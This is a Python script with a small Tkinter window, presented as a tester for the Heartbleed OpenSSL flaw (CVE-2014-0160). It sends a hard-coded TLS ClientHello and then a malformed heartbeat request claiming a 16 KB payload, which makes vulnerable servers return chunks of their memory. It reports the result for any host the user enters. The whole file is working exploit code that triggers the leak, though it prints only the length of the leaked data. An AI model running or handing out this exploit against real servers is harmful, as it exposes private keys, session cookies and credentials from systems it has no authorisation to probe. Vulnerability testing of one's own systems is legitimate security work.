import sys
import struct
import socket
import time
import select
import codecs
from optparse import OptionParser
import tkinter as tk

decode_hex = codecs.getdecoder('hex_codec')

options = OptionParser(usage='%prog server [options]', description='Cyber Project-Test for SSL heartbeat vulnerability (CVE-2014-0160)')
options.add_option('-p', '--port', type='int', default=443)

def hex_to_binary(x):
    return decode_hex(x.replace(' ', '').replace('\n', ''))[0]

client_hello_msg = hex_to_binary('''
    16 03 02 00  dc 01 00 00 d8 03 02 53
    43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
    bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
    00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
    00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
    c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
    c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
    c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
    c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
    00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
    03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
    00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
    00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
    00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
    00 0f 00 01 01                                  
    ''')

heartbeat_msg = hex_to_binary(''' 
    18 03 
    02 00 
    03 01 
    40 00
    ''')

def receive_all(s, length, timeout=5):
    end_time = time.time() + timeout
    received_data = b'' 
    remaining = length
    while remaining > 0: 
        remaining_time = end_time - time.time()
        if remaining_time < 0:
            return None
        r, w, e = select.select([s], [], [], 5) 
        if s in r: 
            data = s.recv(remaining) 
            if not data:
                return None
            received_data += data
            remaining -= len(data)
    return received_data
    
def receive_message(s):
    header = receive_all(s, 5) 
    if header is None:
        print('Unexpected EOF receiving record header - server closed connection')
        return None, None, None
    typ, ver, length = struct.unpack('>BHH', header)  
    payload = receive_all(s, length, 10) 
    if payload is None:
        print('Unexpected EOF receiving record payload - server closed connection')
        return None, None, None
    return typ, ver, payload

def send_heartbeat(s):
    s.send(heartbeat_msg) 
    while True: 
        typ, ver, payload = receive_message(s) 
        if typ is None:
            print('No heartbeat response received.')
            return False

        if typ == 24: 
            if len(payload) > 3:
                print(len(payload))
                print('Server is vulnerable!')
            else:
                print('server might be vulnerable, but did not return any extra data')
            return True

        if typ == 21: 
            return False

def testUrl(url):
    opts, args = options.parse_args()
    

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    sys.stdout.flush() 
    client_socket.connect((url, opts.port)) 
    
    client_socket.send(client_hello_msg) 
    while True:  
        typ, ver, payload = receive_message(client_socket)  
        if typ == None:
            print('Server closed connection without sending Server Hello.')
            return 
        if typ == 22 and payload[0] == 0x0E:  
            break

    return send_heartbeat(client_socket)


def submit():
    url_to_check = entry.get()
    try:
        if testUrl(url_to_check):
            result_label.config(text="Vulnerable")
        else:
            result_label.config(text="Not Vulnerable")
    except: 
        result_label.config(text="Something Went Wrong")

if __name__ == '__main__':
    root = tk.Tk()
    root.title("URL Input")

    label = tk.Label(root, text="Enter URL:")
    label.pack()

    entry = tk.Entry(root, width=30)
    entry.pack()

    submit_button = tk.Button(root, text="Submit", command=submit)
    submit_button.pack()

    result_label = tk.Label(root, text="")
    result_label.pack()

    root.mainloop()
   

